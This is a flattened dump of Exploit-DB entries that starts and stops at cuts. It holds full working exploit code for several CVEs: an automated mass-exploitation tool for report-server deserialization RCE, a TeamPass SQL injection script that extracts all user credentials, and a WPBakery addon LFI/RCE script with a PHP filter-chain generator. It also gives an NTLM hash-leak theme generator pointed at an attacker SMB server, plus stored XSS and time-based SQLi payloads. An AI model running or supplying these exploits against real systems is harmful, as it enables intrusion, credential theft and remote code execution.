args=parser.parseargs() async def report(result): try: if args.output: if os.path.isfile(args.output): filename = args.output elif os.path.isdir(args.output): filename = os.path.join(args.output, f""results.txt"") else: filename = args.output else: filename = ""results.txt"" async with aiofiles.open(filename, ""a"") as w: await w.write(result + '\n') except KeyboardInterrupt as e: quit() except asyncio.CancelledError as e: SystemExit except Exception as e: pass async def randomizer(): try: strings = string.asciiletters return ''.join(random.choices(strings, k=30)) except Exception as e: print(f""Exception in randomizer :{e}, {type(e)}"") async def exploit(payload,url, authToken, session, user, psw): try: randomReport = await randomizer() headers = {""Authorization"" : f""Bearer {authToken}""} body1 = {""reportName"":randomReport, ""categoryName"":""Samples"", ""description"":None, ""reportContent"":payload, ""extension"":"".trdp"" proxy = args.proxy if args.proxy else None async with session.post( f""{url}/api/reportserver/report"", ssl=False, timeout=30, proxy=proxy, json=body1, headers=headers) as response1: if response1.status !=200: print(f""[{bold}{green}Vulnerale{reset}]: {bold}{white}Report for: {url}\n Login Crendentials: Usename: {user} | Password: {psw} | Authentication Token: {authToken}\n Deserialization RCE: Failed{reset}"") await report(f""Report for: {url}\n Login Crendentials: Usename: {user} | Password: {psw} | Authentication Token: {authToken}\n Deserialization RCE: Failed\n-"") return async with session.post( f""{url}/api/reports/clients"", json={""timeStamp"":None}, ssl=False, timeout=30) as response2: if response2.status == 200: responsed2 = await response2.json() id = responsed2['clientId'] else: print(f""[{bold}{green}Vulnerale{reset}]: {bold}{white}Report for: {url}\n Login Crendentials: Usename: {user} | Password: {psw} | Authentication Token: {authToken}\n Report created: {randomReport}\n Deserialization RCE: Failed{reset}"") await report(f""Report for: {url}\n Login Crendentials: Usename: {user} | Password: {psw} | Authentication Token: {authToken}\n Report created: {randomReport}\n Deserialization RCE: Failed\n-"") return body2 ={""report"":f""NAME/Samples/{randomReport}/"", ""parameterValues"":{} async with session.post( f""{url}/api/reports/clients/{id}/parameters"", json=body2, proxy=proxy, ssl=False, timeout=30) as finalresponse: print(f""[{bold}{green}Vulnerale{reset}]: {bold}{white}Report for: {url}\n Login Crendentials: Usename: {user} | Password: {psw} | Authentication Token: {authToken}\n Report created: {randomReport}\n Deserialization RCE: Success{reset}"") await report(f""Report for: {url}\n Login crendential: Usename: {user} | Password: {psw} | Authentication Token: {authToken}\n Report created: {randomReport}\n Deserialization RCE: Success\n-"") except KeyError as e: pass except aiohttp.ClientConnectionError as e: if args.verbose: print(f""[{bold}{yellow}WRN{reset}]: {bold}{white}Timeout reached for {url}{reset}"") except TimeoutError as e: if args.verbose: print(f""[{bold}{yellow}WRN{reset}]: {bold}{white}Timeout reached for {url}{reset}"") except KeyboardInterrupt as e: SystemExit except aiohttp.clientexceptions.ContentTypeError as e: pass except asyncio.CancelledError as e: SystemExit except aiohttp.InvalidURL as e: pass except Exception as e: print(f""Exception at authexploit: {e}, {type(e)}"") async def create(url,user, psw, session): try: baseurl=f""{url}/Startup/Register"" body = {""Username"": user, ""Password"": psw, ""ConfirmPassword"": psw, ""Email"": f""{user}@{user}.org"", ""FirstName"": user, ""LastName"": user} headers = { ""User-Agent"": UserAgent().random, ""Content-Type"": ""application/x-www-form-urlencoded"", async with session.post(baseurl, headers=headers, data=body, ssl=False, timeout=30) as response: if response.status == 200: return ""success"" return ""failed"" except KeyError as e: pass except aiohttp.ClientConnectionError as e: if args.verbose: print(f""[{bold}{yellow}WRN{reset}]: {bold}{white}Timeout reached for {url}{reset}"") except TimeoutError as e: if args.verbose: print(f""[{bold}{yellow}WRN{reset}]: {bold}{white}Timeout reached for {url}{reset}"") except KeyboardInterrupt as e: SystemExit except asyncio.CancelledError as e: SystemExit except aiohttp.InvalidURL as e: pass except aiohttp.clientexceptions.ContentTypeError as e: pass except Exception as e: print(f""Exception at authexploitcreate: {e}, {type(e)}"") async def login(url, user, psw, session): try: baseurl = f""{url}/Token"" body = {""granttype"": ""password"",""username"":user, ""password"": psw} headers = { ""User-Agent"": UserAgent().random, ""Content-Type"": ""application/x-www-form-urlencoded"", async with session.post( baseurl, data=body, headers=headers, ssl=False, timeout=30) as response: if response.status == 200: responsed = await response.json() return responsed['accesstoken'] except KeyError as e: pass except aiohttp.ClientConnectionError as e: if args.verbose: print(f""[{bold}{yellow}WRN{reset}]: {bold}{white}Timeout reached for {url}{reset}"") except TimeoutError as e: if args.verbose: print(f""[{bold}{yellow}WRN{reset}]: {bold}{white}Timeout reached for {url}{reset}"") except KeyboardInterrupt as e: SystemExit except asyncio.CancelledError as e: SystemExit except aiohttp.InvalidURL as e: pass except aiohttp.clientexceptions.ContentTypeError as e: pass except Exception as e: print(f""Exception at authexploitLogin: {e}, {type(e)}"") async def streamwriter(): try: with zipfile.ZipFile(""payloads.trdp"", 'w') as zipf: zipf.writestr('[ContentTypes].xml', ' ') zipf.writestr(""definition.xml"", f' ') except Exception as e: print(f""Exception at streamwriter: {e}, {type(e)}"") async def streamreader(file): try: async with aiofiles.open(file, 'rb') as file: contents = await file.read() bs64encrypted = base64.b64encode(contents).decode('utf-8') return bs64encrypted except Exception as e: print(f""Exception at streamreder: {e}, {type(e)}"") async def core(url, sem, bar): try: user = await randomizer() password = await randomizer() async with aiohttp.ClientSession() as session: status = await create(url, user, password, session) if status == ""success"": await asyncio.sleep(0.001) authJWT = await login(url, user, password, session) if authJWT: payloads = await streamreader(""payloads.trdp"") await exploit(payloads, url, authJWT, session, user, password) await asyncio.sleep(0.002) except Exception as e: print(f""Exception at core: {e}, {type(e)}"") finally: bar() sem.release() async def loader(urls, session, sem, bar): try: tasks = [] for url in urls: await sem.acquire() task = asyncio.ensurefuture(core(url, sem, bar)) tasks.append(task) await asyncio.gather(*tasks, returnexceptions=True) except KeyboardInterrupt as e: SystemExit except asyncio.CancelledError as e: SystemExit except Exception as e: print(f""Exception in loader: {e}, {type(e)}"") async def threads(urls): try: urls = list(set(urls)) sem = asyncio.BoundedSemaphore(args.threads) customloops = uvloop.neweventloop() asyncio.seteventloop(loop=customloops) loops = asyncio.geteventloop() async with aiohttp.ClientSession(loop=loops) as session: with alivebar(title=f""Exploiter"", total=len(urls), enrichprint=False) as bar: loops.rununtilcomplete(await loader(urls, session, sem, bar)) except RuntimeError as e: pass except KeyboardInterrupt as e: SystemExit except Exception as e: print(f""Exception in threads: {e}, {type(e)}"") async def main(): try: urls = [] if args.url: if args.url.startswith("" <URL> or args.url.startswith("" <URL> urls.append(args.url) else: newurl = f"" <URL> urls.append(newurl) newhttp = f"" <URL> urls.append(newhttp) await streamwriter() await threads(urls) if args.list: async with aiofiles.open(args.list, ""r"") as streamr: async for url in streamr: url = url.strip() if url.startswith("" <URL> or url.startswith("" <URL> urls.append(url) else: newurl = f"" <URL> urls.append(newurl) newhttp = f"" <URL> urls.append(newhttp) await streamwriter() await threads(urls) except FileNotFoundError as e: print(f""[{bold}{red}WRN{reset}]: {bold}{white}{args.list} no such file or directory{reset}"") SystemExit except Exception as e: print(f""Exception in main: {e}, {type(3)})"") if name == ""main_"": asyncio.run(main())"
CVE-2024-44871,"{""CVE-2024-44871"": 1}",2025-03-27,MoziloCMS 3.0 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52096,"Exploit Title: MoziloCMS 3.0 - Remote Code Execution (RCE) Date: 10/09/2024 Exploit Author: Secfortress ( <URL> Vendor Homepage: <URL> Software Link: <URL> Version: 3.0 Tested on: Debian Reference: <URL> CVE : CVE-2024-44871 Description MoziloCMS version 3.0 suffers from an arbitrary file upload vulnerability in the component ""/admin/index.php"" which allows an authenticated attacker to execute arbitrary code on the ""Files"" session by uploading a maliciously crafted .JPG file and subsequently renaming its extension to .PHP using the application's renaming function."
CVE-2024-46528,"{""CVE-2024-46528"": 1}",2025-03-27,KubeSphere 3.4.0 - Insecure Direct Object Reference (IDOR),https://www.exploit-db.com/exploits/52097,"Exploit Title: KubeSphere 3.4.0 - Insecure Direct Object Reference (IDOR) Date: 3 September Exploit Author: Okan Kurtulus Vendor Homepage: <URL> Software Link: <URL> Version: [>= 4.0.0 & < 4.1.3] , [>= 3.0.0 & < 3.4.1] Tested on: Ubuntu 22.04 CVE : CVE-2024-46528 1-) Log in to the system with a user who is not registered to any workspace (e.g., a ""platform-regular"" user who has limited authorization). Note: The authorization level of this user is as follows: ""Cannot access any resources before joining a workspace."" 2-) After logging in with this user, it has been observed that cluster information, node information, users registered in the system, and other similar areas can be accessed without the user being registered to any workspace or cluster. Examples of accessible endpoints: <URL> <URL> <URL> <URL> <URL> 0880/clusters/default/monitor-cluster/resource <URL> <URL> <URL>"
CVE-2024-48120,"{""CVE-2024-48120"": 1}",2025-03-27,X2CRM 8.5 - Stored Cross-Site Scripting (XSS),https://www.exploit-db.com/exploits/52098,"Exploit Title: X2CRM 8.5 - Stored Cross-Site Scripting (XSS) Date: 12 September 2024 Exploit Author: Okan Kurtulus Vendor Homepage: <URL> Software Link: <URL> Version: X2CRM v8.5 Tested on: Ubuntu 22.04 CVE : CVE-2024-48120 1-) Log in to the system with any user account. Navigate to the “Opportunities” section from the top menu and select “Create List.” In the “Name” field of the new screen, enter the malicious XSS payload and click “Create.” 2-) Next, return to the “Opportunities” tab and click on “Lists” again. The stored XSS payload will be triggered. XSS Trigger Request: POST /x2crm/x2engine/index.php/opportunities/createList HTTP/1.1 Host: 192.168.1.108 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 390 Origin: <URL> Connection: keep-alive Referer: <URL> Cookie: PHPSESSID=uijrtnp42qqo29vfkb4v0sps3i; YIICSRFTOKEN=Rkw1SWxTc1dpa0Z0OGdpb1RxY0ZGVDY5X3pPMzVFTDGjgTkJmGLFkvRCiY9OO4f0QIHNTvqbSw1t9UVVXL4g%3D%3D; 5d8630d289284e8c14d15b14f4b4dc28=9d5b82f1240eb47cd73a20df560d9b3086847e33a%3A4%3A%7Bi%3A0%3Bs%3A1%3A%223%22%3Bi%3A1%3Bs%3A4%3A%22test%22%3Bi%3A2%3Bi%3A2592000%3Bi%3A3%3Ba%3A0%3A%7B%7D%7D; LoginForm[username]=test; LoginForm[rememberMe]=1 Upgrade-Insecure-Requests: 1 Priority: u=0, i YIICSRFTOKEN=Rkw1SWxTc1dpa0Z0OGdpb1RxY0ZGVDY5X3pPMzVFTDGjgTkJmGLFkvRCiY9OO4f0QIHNTvqbSw1t9UVVXL4g%3D%3D&X2List%5Bname%5D=%3Cscript%3Ealert%282%29%3B%3C%2Fscript%3E&X2List%5Btype%5D=dynamic&X2List%5BassignedTo%5D=test2&X2List%5Bvisibility%5D=1&X2List%5BlogicType%5D=AND&X2List%5Battribute%5D%5B%5D=alternativeEmail&X2List%5Bcomparison%5D%5B%5D=%3D&X2List%5Bvalue%5D%5B%5D=test&yt0=Create"
CVE-2024-0132,"{""CVE-2024-0132"": 1}",2025-03-26,NVIDIA Container Toolkit 1.16.1 - Time-of-check Time-of-Use (TOCTOU),https://www.exploit-db.com/exploits/52095,"Exploit Title: Container Breakout with NVIDIA Container Toolkit Date: 17/02/2025 Exploit Author: r0binak Software Link Homepage: <URL> Version: 1.16.1 Tested on: NVIDIA Container Tooklit 1.16.1 CVE: CVE-2024-0132 Description: NVIDIA Container Toolkit 1.16.1 or earlier contains a Time-of-check Time-of-Use (TOCTOU) vulnerability when used with default configuration where a specifically crafted container image may gain access to the host file system. This does not impact use cases where CDI is used. A successful exploit of this vulnerability may lead to code execution, denial of service, escalation of privileges, information disclosure, and data tampering."
CVE-2024-21320,"{""CVE-2024-21320"": 1}",2025-03-22,Microsoft Windows - NTLM Hash Leak Malicious Windows Theme,https://www.exploit-db.com/exploits/52092,"Exploit Title: CVE-2024-21320 - NTLM Hash Leak via Malicious Windows Theme Date: 02/03/2025 Exploit Author: Abinesh Kamal K U CVE : CVE-2024-21320 Ref: <URL> #Step 1: Install Responder Responder is a tool to capture NTLM hashes over SMB. git clone <URL> cd Responder Replace eth0 with your network interface. #Step 2: Create a Malicious Windows Theme File Python Script to Generate the Malicious .theme File import os Attacker-controlled SMB server IP attackersmbserver = ""192.168.1.100"" Change this to your attacker's IP Name of the malicious theme file themefilename = ""malicious.theme"" Malicious .theme file content themecontent = f"" [Theme] DisplayName=Security Update Theme [Control Panel\Desktop] Wallpaper=\{attackersmbserver}\\share\\malicious.jpg [VisualStyles] Path=%SystemRoot%\\resources\\Themes\\Aero\\Aero.msstyles ColorStyle=NormalColor Size=NormalSize Write the theme file with open(themefilename, ""w"") as themefile: themefile.write(themecontent) print(f""[+] Malicious theme file '{themefilename}' created."") Optional: Start a Python HTTP server to serve the malicious theme file starthttp = input(""Start HTTP server to deliver theme file? (y/n): "").strip().lower() if starthttp == ""y"": print(""[+] Starting HTTP server on port 8080."") os.system(""python3 -m http.server 8080"") #Step 3: Deliver & Capture NTLM Hashes 1. Send the `malicious.theme` file to the target. 2. Run Responder to capture the NTLM hash: sudo python3 Responder.py -I eth0 3. Wait for the victim to open the `.theme` file. 4. Extract NTLM hash from Responder logs and crack it using hashcat: hashcat -m 5600 capturedhashes.txt rockyou.txt Abinesh Kamal K U abineshjerry.info MTech - Cyber Security Systems & Networks Amrita University"
CVE-2023-1545,"{""CVE-2023-1545"": 1}",2025-03-22,TeamPass 3.0.0.21 - SQL Injection,https://www.exploit-db.com/exploits/52094,"Exploit Title: TeamPass SQL Injection Google Dork: intitle:""Teampass"" + inurl:index.php?page=items Date: 02/23/2025 Exploit Author: Max Meyer - Rivendell Vendor Homepage: <URL> Software Link: <URL> Version: 2.1.24 and prior Tested on: Windows/Linux CVE : CVE-2023-1545 #!/usr/bin/env python3 import sys import json import base64 import logging import requests from typing import Optional, Dict, Any from dataclasses import dataclass Configuração de logging logging.basicConfig( level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s' logger = logging.getLogger(name) class TeamPassExploit: baseurl: str arbitraryhash: str = '$2y$10$u5S27wYJCVbaPTRiHRsx7.iImx/WxRA8/tKvWdaWQ/iDuKlIkMbhq' def post_init(self): self.vulnerableurl = f""{self.baseurl}/api/index.php/authorize"" def checkapienabled(self) -> bool: ""Verifica se a API está habilitada."" try: response = requests.get(self.vulnerableurl) if ""API usage is not allowed"" in response.text: logger.error(""API feature is not enabled"") return False return True except requests.RequestException as e: logger.error(f""Erro ao verificar API: {e}"") return False def executesql(self, sqlquery: str) -> Optional[str]: ""Executa uma query SQL através da vulnerabilidade."" try: inject = f""none' UNION SELECT id, '{self.arbitraryhash}', ({sqlquery}), privatekey, "" \ ""personalfolder, fonctionid, groupesvisibles, groupesinterdits, 'foo' "" \ ""FROM teampassusers WHERE login='admin"" data = { ""login"": inject, ""password"": ""h4ck3d"", ""apikey"": ""foo"" response = requests.post( self.vulnerableurl, headers={""Content-Type"": ""application/json""}, json=data if not response.ok: logger.error(f""Erro na requisição: {response.statuscode}"") return None token = response.json().get('token') if not token: logger.error(""Token não encontrado na resposta"") return None Decodifica o token JWT tokenparts = token.split('.') if len(tokenparts) < 2: logger.error(""Token JWT inválido"") return None payload = base64.b64decode(tokenparts[1] + '=' (-len(token_parts[1]) % 4)) return json.loads(payload).get('public_key') except Exception as e: logger.error(f""Erro ao executar SQL: {e}"") return None def get_user_credentials(self) -> Optional[Dict[str, str]]: ""Obtém credenciais de todos os usuários."" try: Obtém número total de usuários user_count = self.execute_sql(""SELECT COUNT() FROM teampassusers WHERE pw != ''"") if not usercount or not usercount.isdigit(): logger.error(""Não foi possível obter o número de usuários"") return None usercount = int(usercount) logger.info(f""Encontrados {usercount} usuários no sistema"") credentials = {} for i in range(usercount): username = self.executesql( f""SELECT login FROM teampassusers WHERE pw != '' ORDER BY login ASC LIMIT {i},1"" password = self.executesql( f""SELECT pw FROM teampassusers WHERE pw != '' ORDER BY login ASC LIMIT {i},1"" if username and password: credentials[username] = password logger.info(f""Credenciais obtidas para: {username}"") return credentials except Exception as e: logger.error(f""Erro ao obter credenciais: {e}"") return None def main(): if len(sys.argv) < 2: logger.error(""Usage: python3 script.py "") sys.exit(1) exploit = TeamPassExploit(sys.argv[1]) if not exploit.checkapienabled(): sys.exit(1) credentials = exploit.getusercredentials() if credentials: print(""\nCredenciais encontradas:"") for username, password in credentials.items(): print(f""{username}: {password}"") if name == ""main_"": main()"
CVE-2025-2126,"{""CVE-2025-2126"": 1}",2025-03-20,JUX Real Estate 3.4.0 - SQL Injection,https://www.exploit-db.com/exploits/52089,"Exploit Title: JUX Real Estate 3.4.0 - SQL Injection Exploit Author: CraCkEr Date: 26/02/2025 Vendor: JoomlaUX Vendor Homepage: <URL> Software Link: <URL> Demo Link: <URL> Tested on: Windows 11 Pro Impact: Database Access CWE: CWE-89 - CWE-74 - CWE-707 CVE: CVE-2025-2126 VDB: VDB-299039 #Description SQL injection attacks can allow unauthorized access to sensitive data, modification of data and crash the application or make it unavailable, leading to lost revenue and damage to a company's reputation. Path: /extensions/realestate/index.php/properties/list/list-with-sidebar/realties GET Parameter 'title' is vulnerable to SQLi Parameter: title (GET) Type: time-based blind Title: MySQL >= 5.0.12 time-based blind (query SLEEP) Payload: option=comjuxrealestate&view=realties&Itemid=148&title='XOR(SELECT(0)FROM(SELECT(SLEEP(6)a)XOR'Z&pricesliderlower=63752&pricesliderupper=400000&areasliderlower=30&areasliderupper=400&typeid=2&catid=8&countryid=73&locstate=187&beds=1&agentid=112&baths=1&jpyearbuilt=&button=Search"
CVE-2023-0159,"{""CVE-2023-0159"": 1}",2025-03-19,Extensive VC Addons for WPBakery page builder 1.9.0 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52085,"Exploit Title: Extensive VC Addons for WPBakery page builder < 1.9.1 - Unauthenticated RCE Date: 12 march 2025 Exploit Author: Ravina Vendor Homepage: wprealize Version: 1.9.1 Tested on: windows, linux CVE ID : CVE-2023-0159 Vulnerability Type: Remote Code Execution CVE-2023-0159scan.py #!/usr/bin/env python3 LFI: ./exploit.py --mode lfi --target <URL> --file /etc/passwd RCE: ./exploit.py --mode rce --target <URL> --command ""id"" --generator /path/to/phpfilterchaingenerator.py import argparse import requests import base64 import subprocess import time import phpfilterchaingenerator def runlfi(target, filepath): url = f""{target}/wp-admin/admin-ajax.php"" payload = { 'action': 'extensivevcinitshortcodepagination', 'options[template]': f'php://filter/convert.base64-encode/resource={filepath}' try: response = requests.post(url, data=payload) if response.statuscode == 200 and '{""status"":""success"",""message"":""Items are loaded"",""data"":' in response.text: try: jsondata = response.json() base64content = jsondata['data']['items'] decoded = base64.b64decode(base64content).decode() print(f""\n[+] Successfully read {filepath}:\n"") print(decoded) except Exception as e: print(f""[-] Decoding failed: {str(e)}"") print(f""Raw response (truncated): {response.text[:500]}."") else: print(f""[-] LFI failed (Status: {response.statuscode})"") except Exception as e: print(f""[-] Request failed: {str(e)}"") def runrce(target, command, generatorpath): Base64 encode command to handle special characters encodedcmd = base64.b64encode(command.encode()).decode() phpcode = f' ' Generate filter chain try: result = subprocess.run( [generatorpath, '--chain', phpcode], captureoutput=True, text=True, check=True payload = None for line in result.stdout.split('\n'): if line.startswith('php://filter'): payload = line.strip() break if not payload: print(""[-] Failed to generate payload"") return url = f""{target}/wp-admin/admin-ajax.php"" data = {'action': 'extensivevcinitshortcodepagination', 'options[template]': payload} print(f""[] Sending payload for command: {command}"") start_time = time.time() Send the request to attempt RCE and dont forget to pass the generator path response = requests.post(url, data=data) elapsed = time.time() - start_time print(f""\n[+] Response time: {elapsed:.2f} seconds"") print(f""[+] Status code: {response.status_code}"") if response.status_code == 200: print(""\n[+] Response content:"") print(response.text[:1000] + (""."" if len(response.text) > 1000 else """")) except subprocess.CalledProcessError as e: print(f""[-] Filter chain generator failed: {e.stderr}"") except FileNotFoundError: print(f""[-] Generator not found at {generator_path}"") except Exception as e: print(f""[-] RCE failed: {str(e)}"") def main(): parser = argparse.ArgumentParser(description=""CVE-2023-0159 Exploit Script"") parser.add_argument(""--mode"", choices=[""lfi"", ""rce""], required=True, help=""Exploit mode"") parser.add_argument(""--target"", required=True, help=""Target URL (e.g., <URL> parser.add_argument(""--file"", help=""File path for LFI mode"") parser.add_argument(""--command"", help=""Command to execute for RCE mode"") parser.add_argument(""--generator"", default=""php_filter_chain_generator.py"", help=""Path to php_filter_chain_generator.py"") args = parser.parse_args() if args.mode == ""lfi"": if not args.file: print(""[-] Missing --file argument for LFI mode"") return run_lfi(args.target.rstrip('/'), args.file) elif args.mode == ""rce"": if not args.command: print(""[-] Missing --command argument for RCE mode"") return run_rce(args.target.rstrip('/'), args.command, args.generator) if __name__ == ""__main__"": main() php_filter_chain_generator.py #!/usr/bin/env python3 import argparse import base64 import re No need to guess a valid filename anymore file_to_use = ""php://temp"" conversions = { '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2', '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4', '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921', '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE', '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE', '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2', '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2', '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4', '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2', '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB', 'A': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213', 'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE', 'B': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000', 'b': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE', 'C': 'convert.iconv.UTF8.CSISO2022KR', 'c': 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2', 'D': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213', 'd': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5', 'E': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT', 'e': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937', 'F': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB', 'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213', 'g': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8', 'G': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90', 'H': 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213', 'h': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE', 'I': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213', 'i': 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000', 'J': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4', 'j': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16', 'K': 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE', 'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2', 'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC', 'l': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE', 'M':'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T', 'm':'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949', 'N': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4', 'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61', 'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775', 'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE', 'P': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB', 'p': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4', 'q': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2', 'Q': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2', 'R': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4', 'r': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101', 'S': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS', 's': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90', 'T': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103', 't': 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS', 'U': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943', 'u': 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61', 'V': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB', 'v': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2', 'W': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936', 'w': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE', 'X': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932', 'x': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS', 'Y': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361', 'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT', 'Z': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16', 'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937', '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4', '+': 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157', def generate_filter_chain(chain, debug_base64 = False): encoded_chain = chain generate some garbage base64 filters = ""convert.iconv.UTF8.CSISO2022KR|"" filters += ""convert.base64-encode|"" make sure to get rid of any equal signs in both the string we just generated and the rest of the file filters += ""convert.iconv.UTF8.UTF7|"" for c in encoded_chain[::-1]: filters += conversions[c] + ""|"" decode and reencode to get rid of everything that isn't valid base64 filters += ""convert.base64-decode|"" filters += ""convert.base64-encode|"" get rid of equal signs filters += ""convert.iconv.UTF8.UTF7|"" if not debug_base64: don't add the decode while debugging chains filters += ""convert.base64-decode"" final_payload = f""php://filter/{filters}/resource={file_to_use}"" return final_payload def main(): Parsing command line arguments parser = argparse.ArgumentParser(description=""PHP filter chain generator."") parser.add_argument(""--chain"", help=""Content you want to generate. (you will maybe need to pad with spaces for your payload to work)"", required=False) parser.add_argument(""--rawbase64"", help=""The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug."", required=False) args = parser.parse_args() if args.chain is not None: chain 